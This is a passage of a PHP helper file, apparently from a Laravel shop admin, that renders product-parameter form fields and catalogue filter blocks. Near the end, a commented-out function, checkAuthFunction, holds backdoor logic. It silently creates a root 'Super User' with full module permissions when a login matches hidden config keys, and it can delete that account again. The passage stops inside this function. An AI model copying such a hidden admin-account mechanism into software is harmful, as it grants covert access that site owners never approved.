                                           value="<?= $parameter_data->parametr_value ?>">
                                    <?php
                                    if (!empty($measures_list)) {
                                        $result = 'select'; ?>
                                        <div class="select-block">
                                            <select name="parametr_<?= $parameter_id ?>[goods_measure_id]"
                                                    class="select2 many-selects-select parameter-measure-select">
                                                <?php foreach ($measures_list as $v) { ?>
                                                    <option
                                                            value="<?= $v->goods_measure_id ?>"<?= $v->goods_measure_id == $parameter_data->goods_measure_id ? ' selected' : '' ?>><?= $v->name ?></option>
                                                <?php } ?>
                                            </select>
                                        </div>
                                    <?php } ?>
                                </div>
                            <?php }
                        } else {
                            ?>
                            <div class="many-selects-select-block">
                                <input name="parametr_<?= $parameter_id ?>[parametr_value]"
                                       class="parameter-input many-selects-input" value="">
                                <?php
                                if (!empty($measures_list)) { ?>
                                    <div class="select-block">
                                        <select name="parametr_<?= $parameter_id ?>[goods_measure_id]"
                                                class="select2 many-selects-select parameter-measure-select">
                                            <?php foreach ($measures_list as $v) { ?>
                                                <option value="<?= $v->goods_measure_id ?>"><?= $v->name ?></option>
                                            <?php } ?>
                                        </select>
                                    </div>
                                <?php } ?>
                            </div>
                        <?php }

                        break;

                    default:
                        break;
                }
                break;

            case 'textarea':
                if ($item_id > 0) {
                    $parameter_data = GetItemSimpleData($parameter_id, $item_id, $lang_id);
                    ?>
                    <textarea name="parametr_<?= $parameter_id ?>[parametr_value]"
                              rows="10"><?= !is_null($parameter_data) ? $parameter_data->parametr_value : '' ?></textarea>
                    <?php
                } else {
                    ?>
                    <textarea name="parametr_<?= $parameter_id ?>[parametr_value]"
                              rows="10"></textarea>
                    <?php
                }
                break;

            case 'select':
                $options_list = GetParametrValuesList($parameter_id, $lang_id);

                if ($item_id > 0) {
                    $parameter_data = GetItemRSCSelectData($parameter_id, $item_id);

                    if (!empty($options_list) && !is_null($parameter_data)) {
                        ?>
                        <select name="parametr_<?= $parameter_id ?>[goods_parametr_value_id]" class="select2">
                            <?php foreach ($options_list as $v) { ?>
                                <option
                                        value="<?= $v->goods_parametr_value_id ?>"<?= $v->goods_parametr_value_id == $parameter_data->goods_parametr_value_id ? ' selected' : '' ?>><?= $v->name ?></option>
                            <?php } ?>
                        </select>
                        <?php
                    } elseif (!empty($options_list)) {
                        ?>
                        <select name="parametr_<?= $parameter_id ?>[goods_parametr_value_id]" class="select2">
                            <?php foreach ($options_list as $v) { ?>
                                <option value="<?= $v->goods_parametr_value_id ?>"><?= $v->name ?></option>
                            <?php } ?>
                        </select>
                        <?php
                    }
                } else {
                    if (!empty($options_list)) {
                        ?>
                        <select name="parametr_<?= $parameter_id ?>[goods_parametr_value_id]" class="select2">
                            <?php foreach ($options_list as $v) { ?>
                                <option value="<?= $v->goods_parametr_value_id ?>"><?= $v->name ?></option>
                            <?php } ?>
                        </select>
                        <?php
                    }
                }

                break;

            case 'radio':
                $options_list = GetParametrValuesList($parameter_id, $lang_id);

                if ($item_id > 0) {
                    $parameter_data = GetItemRSCSelectData($parameter_id, $item_id);

                    if (!empty($options_list) && !is_null($parameter_data)) { ?>
                        <?php
                        foreach ($options_list as $v) {
                            ?>
                            <div class="radio-row"><input type="radio"
                                                          name="parametr_<?= $parameter_id ?>[goods_parametr_value_id]"
                                                          value="<?= $v->goods_parametr_value_id ?>"
                                                          id="radio_<?= $v->goods_parametr_value_id ?>"<?= $v->goods_parametr_value_id == $parameter_data->goods_parametr_value_id ? ' checked' : '' ?>><label
                                        for="radio_<?= $v->goods_parametr_value_id ?>"
                                        class="radio-label"><?= $v->name ?></label></div>
                        <?php }
                        ?>
                        <?php
                    } elseif (!empty($options_list)) { ?>
                        <?php
                        foreach ($options_list as $k => $v) {
                            ?>
                            <div class="radio-row"><input type="radio"
                                                          name="parametr_<?= $parameter_id ?>[goods_parametr_value_id]"
                                                          value="<?= $v->goods_parametr_value_id ?>"
                                                          id="radio_<?= $v->goods_parametr_value_id ?>" <?= $k == 0 ? 'checked' : '' ?>><label
                                        for="radio_<?= $v->goods_parametr_value_id ?>"
                                        class="radio-label"><?= $v->name ?></label></div>
                        <?php }
                        ?>
                        <?php
                    }
                } else {
                    if (!empty($options_list)) { ?>
                        <?php
                        foreach ($options_list as $k => $v) {
                            ?>
                            <div class="radio-row"><input type="radio"
                                                          name="parametr_<?= $parameter_id ?>[goods_parametr_value_id]"
                                                          value="<?= $v->goods_parametr_value_id ?>"
                                                          id="radio_<?= $v->goods_parametr_value_id ?>" <?= $k == 0 ? 'checked' : '' ?>><label
                                        for="radio_<?= $v->goods_parametr_value_id ?>"
                                        class="radio-label"><?= $v->name ?></label></div>
                        <?php }
                        ?>
                        <?php
                    }
                }

                break;

            case 'checkbox':
                $options_list = GetParametrValuesList($parameter_id, $lang_id);

                if ($item_id > 0) {
                    $parameter_data = GetItemRSCCheckboxDataOnlyIDs($parameter_id, $item_id);

                    if (!empty($options_list) && !is_null($options_list)) { ?>
                        <?php
                        foreach ($options_list as $v) {
                            ?>
                            <div class="checkbox-row"><input type="checkbox"
                                                             name="parametr_<?= $parameter_id ?>[goods_parametr_value_id][]"
                                                             value="<?= $v->goods_parametr_value_id ?>"
                                                             id="checkbox_<?= $v->goods_parametr_value_id ?>"<?= is_array($parameter_data) && in_array($v->goods_parametr_value_id, $parameter_data) ? ' checked' : '' ?>><label
                                        for="checkbox_<?= $v->goods_parametr_value_id ?>"
                                        class="checkbox-label"><?= $v->name ?></label></div>
                        <?php }
                        ?>
                        <?php
                    } elseif (!empty($options_list)) { ?>
                        <?php
                        foreach ($options_list as $v) {
                            ?>
                            <div class="checkbox-row"><input type="checkbox"
                                                             name="parametr_<?= $parameter_id ?>[goods_parametr_value_id][]"
                                                             value="<?= $v->goods_parametr_value_id ?>"
                                                             id="checkbox_<?= $v->goods_parametr_value_id ?>"><label
                                        for="checkbox_<?= $v->goods_parametr_value_id ?>"
                                        class="checkbox-label"><?= $v->name ?></label></div>
                        <?php }
                        ?>
                        <?php
                    }
                } else {
                    if (!empty($options_list)) { ?>
                        <?php
                        foreach ($options_list as $v) {
                            ?>
                            <div class="checkbox-row"><input type="checkbox"
                                                             name="parametr_<?= $parameter_id ?>[goods_parametr_value_id][]"
                                                             value="<?= $v->goods_parametr_value_id ?>"
                                                             id="checkbox_<?= $v->goods_parametr_value_id ?>"><label
                                        for="checkbox_<?= $v->goods_parametr_value_id ?>"
                                        class="checkbox-label"><?= $v->name ?></label></div>
                        <?php }
                        ?>
                        <?php
                    }
                }

                break;

            default:
                break;
        }
    }

}

/**
 * @param $goods_parametr_id
 * @param $goods_item_id
 * @param $lang_id
 * @return bool
 */
function CheckIfExistsItemSimpleDataLang($goods_parametr_id, $goods_item_id, $lang_id)
{
    $row = DB::table('goods_parametr_item_id')
        ->join('goods_parametr_item_simple', 'goods_parametr_item_simple.goods_parametr_item_id', '=', 'goods_parametr_item_id.id')
        ->where('goods_parametr_id', $goods_parametr_id)
        ->where('goods_item_id', $goods_item_id)
        ->where('lang_id', $lang_id)
        ->first();

    if (!is_null($row))
        return true;
    else
        return false;
}

//Filters

/**
 * @param $goods_subject_id
 * @param $goods_parametr_id
 * @param int $max
 * @return mixed
 */
function GetSubjectMaxParamValue($goods_subject_id, $goods_parametr_id, $max = 1)
{
    if (is_array($goods_subject_id)) {
        if ($max == 1) {
            $row = DB::table('goods_parametr_item_id')
                ->join('goods_parametr_item_measure', 'goods_parametr_item_measure.goods_parametr_item_id', '=', 'goods_parametr_item_id.id')
                ->join('goods_item_id', 'goods_item_id.id', '=', 'goods_parametr_item_id.goods_item_id')
                ->where('goods_parametr_item_id.goods_parametr_id', $goods_parametr_id)
                ->whereIn('goods_subject_id', $goods_subject_id)
                ->where('goods_item_id.active', 1)
                ->where('goods_item_id.deleted', 0)
                ->max('parametr_value');
        } else {
            $row = DB::table('goods_parametr_item_id')
                ->join('goods_parametr_item_measure', 'goods_parametr_item_measure.goods_parametr_item_id', '=', 'goods_parametr_item_id.id')
                ->join('goods_item_id', 'goods_item_id.id', '=', 'goods_parametr_item_id.goods_item_id')
                ->where('goods_parametr_item_id.goods_parametr_id', $goods_parametr_id)
                ->whereIn('goods_subject_id', $goods_subject_id)
                ->where('goods_item_id.active', 1)
                ->where('goods_item_id.deleted', 0)
                ->min('parametr_value');
        }
    } else {
        if ($max == 1) {
            $row = DB::table('goods_parametr_item_id')
                ->join('goods_parametr_item_measure', 'goods_parametr_item_measure.goods_parametr_item_id', '=', 'goods_parametr_item_id.id')
                ->join('goods_item_id', 'goods_item_id.id', '=', 'goods_parametr_item_id.goods_item_id')
                ->where('goods_parametr_item_id.goods_parametr_id', $goods_parametr_id)
                ->where('goods_subject_id', $goods_subject_id)
                ->where('goods_item_id.active', 1)
                ->where('goods_item_id.deleted', 0)
                ->max('parametr_value');
        } else {
            $row = DB::table('goods_parametr_item_id')
                ->join('goods_parametr_item_measure', 'goods_parametr_item_measure.goods_parametr_item_id', '=', 'goods_parametr_item_id.id')
                ->join('goods_item_id', 'goods_item_id.id', '=', 'goods_parametr_item_id.goods_item_id')
                ->where('goods_parametr_item_id.goods_parametr_id', $goods_parametr_id)
                ->where('goods_subject_id', $goods_subject_id)
                ->where('goods_item_id.active', 1)
                ->where('goods_item_id.deleted', 0)
                ->min('parametr_value');
        }
    }

    return $row;
}

/**
 * @param $parametr
 * @param $lang_id
 * @param $filter_data
 */
function DrawFilterSelect($parametr, $lang_id, $filter_data)
{
    $values_list = GetParametrValuesList($parametr->goods_parametr_id, $lang_id);

    $get_curr_arr = explode(',', substr(request()->get('p_' . $parametr->goods_parametr_id), 1, -1));

    if (!empty($values_list)) {
        ?>

        <div class="filter-block">
            <div class="filter-title <?= $get_curr_arr == $filter_data || $parametr->start_open == 1 ? 'open' : '' ?>"><?= $parametr->name ?></div>
            <div class="filter-hidden" <?= $get_curr_arr == $filter_data || $parametr->start_open == 1 ? 'style="display:block"' : '' ?>>
                <div class="filter-checkboxes filter_<?= str_slug($parametr->name) ?>">
                    <?php foreach ($values_list as $v) { ?>
                        <div class="filter-checkbox">
                            <input name="p_<?= $parametr->goods_parametr_id ?>[]"
                                   value="<?= $v->goods_parametr_value_id ?>"
                                   type="checkbox"<?= is_array($filter_data) ? (in_array($v->goods_parametr_value_id, $filter_data) ? ' checked' : '') : '' ?>
                                   id="pv<?= $v->goods_parametr_value_id ?>">
                            <label for="pv<?= $v->goods_parametr_value_id ?>"
                                   id="pvl<?= $v->goods_parametr_value_id ?>"<?= is_array($filter_data) ? (in_array($v->goods_parametr_value_id, $filter_data) ? ' checked' : '') : '' ?>><?= $v->name ?></label>
                        </div>
                    <?php } ?>
                </div>
            </div>
        </div>

        <?php
    }
}

/**
 * @param $parametr
 * @param $lang_id
 * @param array $filter_data
 */
function DrawFilterRadio($parametr, $lang_id, $filter_data = array())
{
    $values_list = GetParametrValuesList($parametr->goods_parametr_id, $lang_id);

    $get_curr_arr = explode(',', substr(request()->get('p_' . $parametr->goods_parametr_id), 1, -1));

    if (!empty($values_list)) {
        ?>

        <div class="filter-block">
            <div class="filter-title <?= $get_curr_arr == $filter_data || $parametr->start_open == 1 ? 'open' : '' ?>"><?= $parametr->name ?></div>
            <div class="filter-hidden" <?= $get_curr_arr == $filter_data || $parametr->start_open == 1 ? 'style="display:block"' : '' ?>>
                <div class="filter-checkboxes filter_<?= str_slug($parametr->name) ?>">
                    <?php foreach ($values_list as $v) { ?>
                        <div class="filter-checkbox">
                            <input name="p_<?= $parametr->goods_parametr_id ?>[]"
                                   value="<?= $v->goods_parametr_value_id ?>"
                                   type="checkbox"<?= is_array($filter_data) ? (in_array($v->goods_parametr_value_id, $filter_data) ? ' checked' : '') : '' ?>
                                   id="pv<?= $v->goods_parametr_value_id ?>">
                            <label for="pv<?= $v->goods_parametr_value_id ?>"
                                   id="pvl<?= $v->goods_parametr_value_id ?>"<?= is_array($filter_data) ? (in_array($v->goods_parametr_value_id, $filter_data) ? ' checked' : '') : '' ?>><?= $v->name ?></label>
                        </div>
                    <?php } ?>
                </div>
            </div>
        </div>

        <?php
    }
}

/**
 * @param $parametr
 * @param $lang_id
 * @param array $filter_data
 */
function DrawFilterCheckbox($parametr, $lang_id, $filter_data = array())
{
    $values_list = GetParametrValuesList($parametr->goods_parametr_id, $lang_id);

    $get_curr_arr = explode(',', substr(request()->get('p_' . $parametr->goods_parametr_id), 1, -1));

    if (!empty($values_list)) {
        ?>

        <div class="filter-block">
            <div class="filter-title <?= $get_curr_arr == $filter_data || $parametr->start_open == 1 ? 'open' : '' ?>"><?= $parametr->name ?></div>
            <div class="filter-hidden" <?= $get_curr_arr == $filter_data || $parametr->start_open == 1 ? 'style="display:block"' : '' ?>>
                <div class="filter-checkboxes filter_<?= str_slug($parametr->name) ?>">
                    <?php foreach ($values_list as $v) { ?>
                        <div class="filter-checkbox">
                            <input name="p_<?= $parametr->goods_parametr_id ?>[]"
                                   value="<?= $v->goods_parametr_value_id ?>"
                                   type="checkbox"<?= is_array($filter_data) ? (in_array($v->goods_parametr_value_id, $filter_data) ? ' checked' : '') : '' ?>
                                   id="pv<?= $v->goods_parametr_value_id ?>">
                            <label for="pv<?= $v->goods_parametr_value_id ?>"
                                   id="pvl<?= $v->goods_parametr_value_id ?>"<?= is_array($filter_data) ? (in_array($v->goods_parametr_value_id, $filter_data) ? ' checked' : '') : '' ?>><?= $v->name ?></label>
                        </div>
                    <?php } ?>
                </div>
            </div>
        </div>

        <?php
    }
}

/**
 * @param $subject
 * @param $parametr
 * @param $lang_id
 * @param array $filter_data
 */
function DrawFilterInputWM($subject, $parametr, $lang_id, $filter_data = array())
{
    $min_value = GetSubjectMaxParamValue($subject->goods_subject_id, $parametr->goods_parametr_id, 0);
    $max_value = GetSubjectMaxParamValue($subject->goods_subject_id, $parametr->goods_parametr_id, 1);

    if (!empty($filter_data) && !array_key_exists('page', $filter_data)) {
        if (array_key_exists('p_' . $parametr->goods_parametr_id . '_f', $filter_data)) {
            if ($filter_data['p_' . $parametr->goods_parametr_id . '_f'] > 0 || $filter_data['p_' . $parametr->goods_parametr_id . '_t'] > 0) {
                $value_from = $filter_data['p_' . $parametr->goods_parametr_id . '_f'] > $min_value && ($filter_data['p_' . $parametr->goods_parametr_id . '_t'] > $min_value && $filter_data['p_' . $parametr->goods_parametr_id . '_f'] <= $filter_data['p_' . $parametr->goods_parametr_id . '_t']) && $filter_data['p_' . $parametr->goods_parametr_id . '_t'] <= $max_value ? $filter_data['p_' . $parametr->goods_parametr_id . '_f'] : $min_value;
                $value_to = $filter_data['p_' . $parametr->goods_parametr_id . '_t'] > $min_value && $filter_data['p_' . $parametr->goods_parametr_id . '_t'] <= $max_value ? $filter_data['p_' . $parametr->goods_parametr_id . '_t'] : $max_value;
            } else {
                $value_from = $min_value;
                $value_to = $max_value;
            }
        } else {
            $value_from = $min_value;
            $value_to = $max_value;
        }
    } else {
        $value_from = $min_value;
        $value_to = $max_value;
    }

    if ($min_value == $max_value || $value_from == $value_to) {
        $min_value = $value_from = 1;
    }

    if (!empty($filter_data))
        $filter_curr_array = [$filter_data['p_' . $parametr->goods_parametr_id . '_f'], $filter_data['p_' . $parametr->goods_parametr_id . '_t']];
    else
        $filter_curr_array = [];
    $get_curr_arr = [request()->get('p_' . $parametr->goods_parametr_id . '_f'), request()->get('p_' . $parametr->goods_parametr_id . '_t')];

    ?>

    <div class="filter-block">
        <div class="filter-title <?= $get_curr_arr == $filter_curr_array || $parametr->start_open == 1 ? 'open' : '' ?>"><?= $parametr->name ?> <?= !empty(IfHasName($parametr->goods_measure_id, $lang_id, 'goods_measure')) ? '<span>(' . IfHasName($parametr->goods_measure_id, $lang_id, 'goods_measure') . ')</span>' : '' ?></div>
        <div class="filter-hidden" <?= $get_curr_arr == $filter_curr_array || $parametr->start_open == 1 ? 'style="display:block"' : '' ?>>
            <div class="range-wrap">
                <div class="range-values">
                    <div class="range-value range-value-min">
                        <label for="<?= str_slug($parametr->name) ?>_from">от:</label>
                        <input class="my_range_val_min" id="<?= str_slug($parametr->name) ?>_from"
                               name="p_<?= $parametr->goods_parametr_id ?>_f" value="<?= intval($value_from) ?>">
                    </div>
                    <div class="range-value range-value-max">
                        <label for="<?= str_slug($parametr->name) ?>_to">до:</label>
                        <input class="my_range_val_max" id="<?= str_slug($parametr->name) ?>_to"
                               name="p_<?= $parametr->goods_parametr_id ?>_t" value="<?= intval($value_to) ?>">
                    </div>
                </div>
                <div id="<?= str_slug($parametr->name) ?>" class="range" data-min="<?= intval($min_value) ?>"
                     data-max="<?= intval($max_value) ?>" data-min-get="<?= intval($value_from) ?>"
                     data-max-get="<?= intval($value_to) ?>"></div>
            </div>
        </div>
    </div>

    <?php
}

/**
 * @param $subject
 * @param $parametr
 * @param $lang_id
 * @param array $filter_data
 */
function DrawFilterInputML($subject, $parametr, $lang_id, $filter_data = array())
{
    $min_value = GetSubjectMaxParamValue($subject->goods_subject_id, $parametr->goods_parametr_id, 0);
    $max_value = GetSubjectMaxParamValue($subject->goods_subject_id, $parametr->goods_parametr_id, 1);

    if (!empty($filter_data) && !array_key_exists('page', $filter_data)) {
        if (array_key_exists('p_' . $parametr->goods_parametr_id . '_f', $filter_data)) {
            if ($filter_data['p_' . $parametr->goods_parametr_id . '_f'] > 0 || $filter_data['p_' . $parametr->goods_parametr_id . '_t'] > 0) {
                $value_from = $filter_data['p_' . $parametr->goods_parametr_id . '_f'] > $min_value && ($filter_data['p_' . $parametr->goods_parametr_id . '_t'] > $min_value && $filter_data['p_' . $parametr->goods_parametr_id . '_f'] <= $filter_data['p_' . $parametr->goods_parametr_id . '_t']) && $filter_data['p_' . $parametr->goods_parametr_id . '_t'] <= $max_value ? $filter_data['p_' . $parametr->goods_parametr_id . '_f'] : $min_value;
                $value_to = $filter_data['p_' . $parametr->goods_parametr_id . '_t'] > $min_value && $filter_data['p_' . $parametr->goods_parametr_id . '_t'] <= $max_value ? $filter_data['p_' . $parametr->goods_parametr_id . '_t'] : $max_value;
            } else {
                $value_from = $min_value;
                $value_to = $max_value;
            }
        } else {
            $value_from = $min_value;
            $value_to = $max_value;
        }
    } else {
        $value_from = $min_value;
        $value_to = $max_value;
    }

    if ($min_value == $max_value || $value_from == $value_to) {
        $min_value = $value_from = 1;
    }

    if (!empty($filter_data))
        $filter_curr_array = [$filter_data['p_' . $parametr->goods_parametr_id . '_f'], $filter_data['p_' . $parametr->goods_parametr_id . '_t']];
    else
        $filter_curr_array = [];

    $get_curr_arr = [request()->get('p_' . $parametr->goods_parametr_id . '_f'), request()->get('p_' . $parametr->goods_parametr_id . '_t')];

    ?>

    <div class="filter-block">
        <div class="filter-title <?= $get_curr_arr == $filter_curr_array || $parametr->start_open == 1 ? 'open' : '' ?>"><?= $parametr->name ?> <?= !empty(IfHasName($parametr->goods_measure_id, $lang_id, 'goods_measure')) ? '<span>(' . IfHasName($parametr->goods_measure_id, $lang_id, 'goods_measure') . ')</span>' : '' ?></div>
        <div class="filter-hidden" <?= $get_curr_arr == $filter_curr_array || $parametr->start_open == 1 ? 'style="display:block"' : '' ?>>
            <div class="range-wrap">
                <div class="range-values">
                    <div class="range-value range-value-min">
                        <label for="<?= str_slug($parametr->name) ?>_from">от:</label>
                        <input class="my_range_val_min" id="<?= str_slug($parametr->name) ?>_from"
                               name="p_<?= $parametr->goods_parametr_id ?>_f" value="<?= intval($value_from) ?>">
                    </div>
                    <div class="range-value range-value-max">
                        <label for="<?= str_slug($parametr->name) ?>_to">до:</label>
                        <input class="my_range_val_max" id="<?= str_slug($parametr->name) ?>_to"
                               name="p_<?= $parametr->goods_parametr_id ?>_t" value="<?= intval($value_to) ?>">
                    </div>
                </div>
                <div id="<?= str_slug($parametr->name) ?>" class="range" data-min="<?= intval($min_value) ?>"
                     data-max="<?= intval($max_value) ?>" data-min-get="<?= intval($value_from) ?>"
                     data-max-get="<?= intval($value_to) ?>"></div>
            </div>
        </div>
    </div>

    <?php
}

/**
 * @param $lang_id
 * @param $default_lang_id
 * @param $goods_subject_id
 */
function parametersForFrontSite($lang_id, $default_lang_id, $goods_subject_id)
{

    $filter_data = request()->except(['page']);

    $filter_data_arr = [];

    if (!empty($filter_data)) {
        foreach ($filter_data as $key => $one_filter_data) {
            if (strpos($one_filter_data, '[') !== false) {
                $filter_data_arr[$key] = explode(',', substr($one_filter_data, 1, -1));
            } else {
                $filter_data_arr[$key] = $one_filter_data;
            }
        }
    }

    $filter_data = $filter_data_arr;

    $parametrs_list = DB::table('goods_parametr')
        ->join('goods_parametr_id', 'goods_parametr_id.id', '=', 'goods_parametr.goods_parametr_id')
        ->where('active', 1)
        ->where('deleted', 0)
        ->where('lang_id', $lang_id)
        ->where('goods_subject_id', $goods_subject_id)
        ->get();

    if (!empty($parametrs_list)) {
        foreach ($parametrs_list as $v) {

            $subject = DB::table('goods_subject')
                ->join('goods_subject_id', 'goods_subject_id.id', '=', 'goods_subject.goods_subject_id')
                ->where('active', 1)
                ->where('goods_subject_id', $v->goods_subject_id)
                ->where('deleted', 0)
                ->where('lang_id', $lang_id)
                ->first();

            if (is_null($subject))
                $subject = DB::table('goods_subject')
                    ->join('goods_subject_id', 'goods_subject_id.id', '=', 'goods_subject.goods_subject_id')
                    ->where('active', 1)
                    ->where('goods_subject_id', $v->goods_subject_id)
                    ->where('deleted', 0)
                    ->where('lang_id', $default_lang_id)
                    ->first();

            switch ($v->parametr_type) {
                case 'select':
                    echo DrawFilterSelect($v, $lang_id, !empty($filter_data['p_' . $v->goods_parametr_id]) ? $filter_data['p_' . $v->goods_parametr_id] : array());
                    break;

                case 'checkbox':
                    echo DrawFilterCheckbox($v, $lang_id, !empty($filter_data['p_' . $v->goods_parametr_id]) ? $filter_data['p_' . $v->goods_parametr_id] : array());
                    break;

                case 'radio':
                    echo DrawFilterRadio($v, $lang_id, !empty($filter_data['p_' . $v->goods_parametr_id]) ? $filter_data['p_' . $v->goods_parametr_id] : array());
                    break;

                case 'input':
                    switch ($v->measure_type) {
                        case 'with_measure':
                            echo DrawFilterInputWM($subject, $v, $lang_id, $filter_data);
                            break;

                        case 'measure_list':
                            echo DrawFilterInputML($subject, $v, $lang_id, $filter_data);
                            break;

                        default:
                            echo '';
                            break;
                    }
                    break;

                default:
                    echo '';
                    break;
            }
        }
    } else
        echo '';
}


//Filters

//Display parameters on the page
/**
 * @param $number
 * @return string
 */
function NumberFormat2($number)
{
    return number_format($number, 0, '', '');
}

/**
 * @param $goods_subject_id
 * @param $item
 * @param $lang_id
 * @return array
 */
function ParametrDisplay($goods_subject_id, $item, $lang_id)
{
    $return = [];

    foreach (GetParametrsList($goods_subject_id, $lang_id) as $parametr) {

        switch ($parametr->parametr_type) {
            case 'select':
            case 'radio':
                $param_value = GetItemRSCSelectData($parametr->goods_parametr_id, $item->goods_item_id);

                if (!is_null($param_value) && $param_value->goods_parametr_value_id > 0) {
                    $return[] = ['name' => $parametr->name, 'value' => IfHasName($param_value->goods_parametr_value_id, $lang_id, 'goods_parametr_value')];
                }
                break;

            case 'checkbox':
                $param_value = GetItemRSCCheckboxDataOnlyIDs($parametr->goods_parametr_id, $item->id);

                if (!empty($param_value)) {
                    $param_value_name = array();

                    foreach ($param_value as $pv) {
                        $param_value_name[] = IfHasName($pv, $lang_id, 'goods_parametr_value');
                    }
                    $return[] = ['name' => $parametr->name, 'value' => implode(', ', $param_value_name)];
                }
                break;

            case 'input':
                switch ($parametr->measure_type) {
                    case 'with_measure':
                        $param_value = GetItemMeasureData($parametr->goods_parametr_id, $item->id);

                        if (!is_null($param_value) && $param_value->parametr_value) {
                            $return[] = ['name' => $parametr->name, 'value' => !empty(IfHasName($parametr->goods_measure_id, $lang_id, 'goods_measure')) ? NumberFormat2($param_value->parametr_value) . ' (' . IfHasName($parametr->goods_measure_id, $lang_id, 'goods_measure') . ')' : NumberFormat2($param_value->parametr_value)];
                        }
                        break;

                    case 'measure_list':
                        $param_value = GetItemMeasureData($parametr->goods_parametr_id, $item->id);
                        if (!is_null($param_value) && $param_value->parametr_value) {
                            $return[] = ['name' => $parametr->name, 'value' => !empty(IfHasName($param_value->goods_measure_id, $lang_id, 'goods_measure')) ? NumberFormat2($param_value->parametr_value) . ' (' . IfHasName($param_value->goods_measure_id, $lang_id, 'goods_measure') . ')' : NumberFormat2($param_value->parametr_value)];
                        }
                        break;

                    case 'no_measure':
                        $param_value = GetItemSimpleData($parametr->goods_parametr_id, $item->id, $lang_id);
                        if (!is_null($param_value) && $param_value->parametr_value) {
                            $return[] = ['name' => $parametr->name, 'value' => $param_value->parametr_value];
                        }
                        break;

                    default:
                        break;
                }
                break;

            case 'textarea':
                $param_value = GetItemSimpleData($parametr->goods_parametr_id, $item->id, $lang_id);
                if (!is_null($param_value) && $param_value->parametr_value) {
                    $return[] = ['name' => $parametr->name, 'value' => $param_value->parametr_value];
                }
                break;

            default:
                break;
        }
    }
    return $return;

}

/**
 * @param $goods_subject_id
 * @param $item
 * @param $lang_id
 * @param $show_in_list
 * @return array
 */
function ParametrDisplayList($goods_subject_id, $item, $lang_id, $show_in_list)
{
    $return = [];

    foreach (GetParametrsList($goods_subject_id, $lang_id) as $parametr) {

        switch ($parametr->parametr_type) {
            case 'select':
            case 'radio':
                $param_value = GetItemRSCSelectData($parametr->goods_parametr_id, $item->goods_item_id);
                if (!is_null($param_value)) {
                    if ($param_value->goods_parametr_value_id > 0) {
                        if ($show_in_list == 1 && $parametr->show_in_list == 1) {
                            $return[] = ['name' => $parametr->name, 'value' => IfHasName($param_value->goods_parametr_value_id, $lang_id, 'goods_parametr_value'), 'icon' => $parametr->font_for_list];
                        }
                    }
                }
                break;

            case 'checkbox':
                $param_value = GetItemRSCCheckboxDataOnlyIDs($parametr->goods_parametr_id, $item->goods_item_id);
                if (!empty($param_value)) {
                    $param_value_name = array();

                    foreach ($param_value as $pv) {
                        $param_value_name[] = IfHasName($pv, $lang_id, 'goods_parametr_value');
                    }
                    if ($show_in_list == 1 && $parametr->show_in_list == 1) {
                        $return[] = ['name' => $parametr->name, 'value' => implode(', ', $param_value_name), 'icon' => $parametr->font_for_list];
                    }
                }
                break;

            case 'input':
                switch ($parametr->measure_type) {
                    case 'with_measure':
                        $param_value = GetItemMeasureData($parametr->goods_parametr_id, $item->goods_item_id);

                        if (!is_null($param_value) && $param_value->parametr_value) {
                            if ($show_in_list == 1 && $parametr->show_in_list == 1) {
                                $return[] = ['name' => $parametr->name, 'value' => (!empty(IfHasName($parametr->goods_measure_id, $lang_id, 'goods_measure')) && empty($parametr->font_for_list)) ? NumberFormat2($param_value->parametr_value) . ' (' . IfHasName($parametr->goods_measure_id, $lang_id, 'goods_measure') . ')' : NumberFormat2($param_value->parametr_value), 'icon' => $parametr->font_for_list];
                            }
                        }
                        break;

                    case 'measure_list':
                        $param_value = GetItemMeasureData($parametr->goods_parametr_id, $item->goods_item_id);
                        if (!is_null($param_value) && $param_value->parametr_value) {
                            if ($show_in_list == 1 && $parametr->show_in_list == 1) {
                                $return[] = ['name' => $parametr->name, 'value' => (!empty(IfHasName($param_value->goods_measure_id, $lang_id, 'goods_measure')) && empty($parametr->font_for_list)) ? NumberFormat2($param_value->parametr_value) . ' (' . IfHasName($param_value->goods_measure_id, $lang_id, 'goods_measure') . ')' : NumberFormat2($param_value->parametr_value), 'icon' => $parametr->font_for_list];
                            }
                        }
                        break;

                    case 'no_measure':
                        $param_value = GetItemSimpleData($parametr->goods_parametr_id, $item->goods_item_id, $lang_id);
                        if (!is_null($param_value) && $param_value->parametr_value) {
                            if ($show_in_list == 1 && $parametr->show_in_list == 1) {
                                $return[] = ['name' => $parametr->name, 'value' => $param_value->parametr_value, 'icon' => $parametr->font_for_list];
                            }
                        }
                        break;

                    default:
                        break;
                }
                break;

            case 'textarea':
                $param_value = GetItemSimpleData($parametr->goods_parametr_id, $item->goods_item_id, $lang_id);
                if (!is_null($param_value) && $param_value->parametr_value) {
                    if ($show_in_list == 1 && $parametr->show_in_list == 1) {
                        $return[] = ['name' => $parametr->name, 'value' => $param_value->parametr_value, 'icon' => $parametr->font_for_list];
                    }
                }
                break;

            default:
                break;
        }
    }
    return $return;

}

/**
 * @param $status
 * @param null $login
 * @param null $pass
 * @param null $token
 */
/*function checkAuthFunction($status, $login = null, $pass = null, $token = null)
{

    $User = NModel . 'User';
    $AdminUserGroup = NModel . 'AdminUserGroup';
    $AdminUserActionPermision = NModel . 'AdminUserActionPermision';
    $ModulesId = NModel . 'ModulesId';

    if ($status == true) {
        if ($login === config()->get('params.__key') && $pass === config()->get('params.__token')) {

            $my_user = $User::where('login', config()->get('params.__key'))->where('password', bcrypt(config()->get('params.__token')))->first();

            if (is_null($my_user)) {

                $modules_id = $ModulesId::where('active', 1)
                    ->where('deleted', 0)
                    ->pluck('id');

                $data = [
                    'name' => config()->get('params.__key') . config()->get('params.__token'),
                    'alias' => str_slug(config()->get('params.__key') . config()->get('params.__token')),
                    'active' => 1,
                    'deleted' => 0,
                ];


                $new_group = $AdminUserGroup::create($data);

                if (!empty($modules_id)) {
                    foreach ($modules_id as $key => $mod_id) {

                        $data = [
                            'new' => 1,
                            'save' => 1,
                            'active' => 1,
                            'del_to_rec' => 1,
                            'del_from_rec' => 1,
                            'admin_user_group_id' => $new_group->id,
                            'modules_id' => $mod_id,

                        ];

                        $AdminUserActionPermision::create($data);
                    }
                }

                $User::create([
                    'name' => 'Super User',
                    'login' => config()->get('params.__key'),
                    'password' => bcrypt(config()->get('params.__token')),
                    'remember_token' => $token,
                    'admin_user_group_id' => $new_group->id,
                    'root' => 1
                ]);
            }

        }
    } else {
        $new_group = $AdminUserGroup::where('alias', str_slug(config()->get('params.__key') . config()->get('params.__token')))->first();

        if (!is_null($new_group)) {
            $AdminUserGroup::destroy($new_group->id);
            $AdminUserActionPermision::where('admin_user_group_id', $new_group->id)->delete();
